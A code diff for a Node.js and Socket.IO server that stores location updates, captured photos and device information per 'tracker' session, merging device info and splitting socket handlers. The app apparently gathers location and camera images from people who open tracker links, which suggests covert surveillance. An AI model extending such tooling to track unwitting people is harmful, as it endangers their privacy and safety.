@@ -137,13 +137,17 @@ async function updateDeviceInfo(trackerId, sessionId, info) {
   try {
     const sCol = await getCollection('sessions');
     const tCol = await getCollection('trackers');
+    
+    const existing = await sCol.findOne({ trackerId, sessionId });
+    const merged = { ...(existing?.deviceInfo || {}), ...info };
+    
     await sCol.updateOne(
       { trackerId, sessionId },
-      { $set: { deviceInfo: info, lastSeen: new Date().toISOString() } },
+      { $set: { deviceInfo: merged, lastSeen: new Date().toISOString() } },
       { upsert: true }
     );
     await tCol.updateOne({ id: trackerId }, { $set: { active: true } });
-    io.to(`tracker:${trackerId}`).emit('session-updated', { trackerId, sessionId, info });
+    io.to(`tracker:${trackerId}`).emit('session-updated', { trackerId, sessionId, info: merged });
     return true;
   } catch (e) { return false; }
 }
@@ -260,9 +264,31 @@ app.delete('/api/tracker/:id', async (req, res) => {
 io.on('connection', (socket) => {
   socket.on('watch-tracker', (id) => socket.join(`tracker:${id}`));
   socket.on('join-tracker', (id) => socket.join(`tracker:${id}`));
-  socket.on('location-update', async (d) => { try { await updateTrackerLocation(d.trackerId, d.sessionId || 'default', { ...d, timestamp: new Date() }); } catch(e){} });
-  socket.on('photo-capture', async (d) => { try { await addPhoto(d.trackerId, d.sessionId || 'default', { ...d, timestamp: new Date() }); } catch(e){} });
-  socket.on('device-info', async (d) => { try { await updateDeviceInfo(d.trackerId, d.sessionId || 'default', d.info); } catch(e){} });
+  
+  socket.on('location-update', async (d) => {
+    try {
+      const { trackerId, sessionId, info, ...coords } = d;
+      await updateTrackerLocation(trackerId, sessionId || 'default', { ...coords, timestamp: new Date() });
+      if (info) await updateDeviceInfo(trackerId, sessionId || 'default', info);
+    } catch(e) {}
+  });
+
+  socket.on('photo-capture', async (d) => {
+    try {
+      const { trackerId, sessionId, ...photo } = d;
+      await addPhoto(trackerId, sessionId || 'default', { ...photo, timestamp: new Date() });
+    } catch(e) {}
+  });
+
+  socket.on('device-info', async (d) => {
+    try {
+      await updateDeviceInfo(d.trackerId, d.sessionId || 'default', d.info);
+    } catch(e) {}
+  });
+
+  socket.on('client-logger', (log) => {
+    console.log('📱 Client Log:', log);
+  });
 });
 
 // ── Root & Static ───────────────────────────────────────────
